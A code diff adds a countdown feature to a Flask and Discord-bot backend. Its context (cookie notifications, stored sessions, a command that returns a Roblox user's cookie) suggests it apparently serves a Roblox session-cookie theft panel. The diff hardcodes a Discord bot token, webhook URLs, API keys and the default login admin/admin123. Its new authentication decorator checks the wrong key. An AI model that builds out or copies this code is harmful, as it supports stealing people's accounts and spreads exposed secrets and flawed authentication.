@@ -20,6 +20,7 @@ import requests as http_requests
 from flask import Flask, render_template, request, jsonify, send_file, session, redirect, url_for
 from flask_cors import CORS
 from dotenv import load_dotenv
+from dotenv import dotenv_values
 from functools import wraps
 
 # =====================================================
@@ -30,6 +31,7 @@ load_dotenv()
 DISCORD_TOKEN = os.getenv('DISCORD_TOKEN', 'MTI2OTI0NTM0MTU0NzYzMDYyMw.G8N4GC.E2Fs9Hbmq528vPuTrlXoaWiAPrrTwdwccrs1hQ')
 DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1518341400842731561/aNePu0KVOBcI_zb_bJNeH9Izd597v27NtJRgb_Xq_nHmKPT2DZdosgqe7ItRt0_RTNz6')  # Cookie notifications
 DISCORD_WEBHOOK_URL_UPDATES = os.getenv('DISCORD_WEBHOOK_URL_UPDATES', 'https://discord.com/api/webhooks/1518591641198530652/s43keFLuzq-Rwr-oafbcYFGGQVTiLuY0zHNdVddHdNTeATADLtVVDV1Ii2A6DINZXNK6')  # Status/config updates
+API_COUNTDOWN = os.getenv('API_COUNTDOWN','rbx_sk_P3nX9mQ7K2vL8aBcY5RzF1dHsU6wEt')
 API_KEY = os.getenv('API_KEY', 'rbx_sk_9f3xKmPvQ7nW2jR8sL5yBcDe4hA6tG1u')
 ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
 ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin123')
@@ -746,6 +748,16 @@ def _is_rate_limited(ip):
 # =====================================================
 # API KEY AUTHENTICATION
 # =====================================================
+def require_api_countdown(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        api_key = request.headers.get('X-API-Key-Countdown', '')
+        if api_key != API_KEY:
+            logger.warning(f"[AUTH] Invalid API key from {request.remote_addr}")
+            return jsonify({'error': 'Unauthorized - Invalid API key'}), 401
+        return f(*args, **kwargs)
+    return decorated_function
+
 def require_api_key(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
@@ -795,6 +807,16 @@ def setup_images():
 @app.route('/')
 def index():
     return render_template('index.html')
+
+@app.route('/get_countdown', methods=['GET'])
+def get_countdown():
+    config = dotenv_values(".env")  # Đọc lại file .env mỗi request
+
+    countdown = int(config.get("COUNTDOWN_HOURS", 12))  # Mặc định 12 nếu chưa có
+
+    return jsonify({
+        "countdown_hours": countdown
+    })
 
 @app.route('/api/sessions', methods=['POST'])
 @require_api_key
@@ -1115,6 +1137,8 @@ def update_admin_config():
         logger.error(f"[CONFIG] Error: {e}")
         return jsonify({'error': str(e)}), 500
 
+
+
 @app.route('/api/admin/change-password', methods=['POST'])
 @login_required
 def change_admin_password():
@@ -1305,6 +1329,28 @@ def start_discord_bot():
             embed.set_footer(text=f"Showing 25/{len(sessions)} sessions. Use /search to find specific account.")
         await interaction.response.send_message(embed=embed)
     
+    # /timeset <hour>
+    from dotenv import set_key
+
+    @tree.command(name="timeset", description="Rework countdown")
+    @app_commands.describe(countdown="Countdown (hours)")
+    async def rework_time(interaction: discord.Interaction, countdown: str):
+        try:
+            countdown = int(countdown)
+
+            set_key(".env", "COUNTDOWN_HOURS", str(countdown))
+
+            await interaction.response.send_message(
+                f"✅ Đã thay đổi countdown thành **{countdown} giờ**."
+            )
+
+        except ValueError:
+            await interaction.response.send_message(
+                f"❌ `{countdown}` không phải là số hợp lệ."
+        )
+
+        
+
     # /cookie <userId>
     @tree.command(name="cookie", description="Get cookie by userId")
     @app_commands.describe(userid="Roblox User ID")
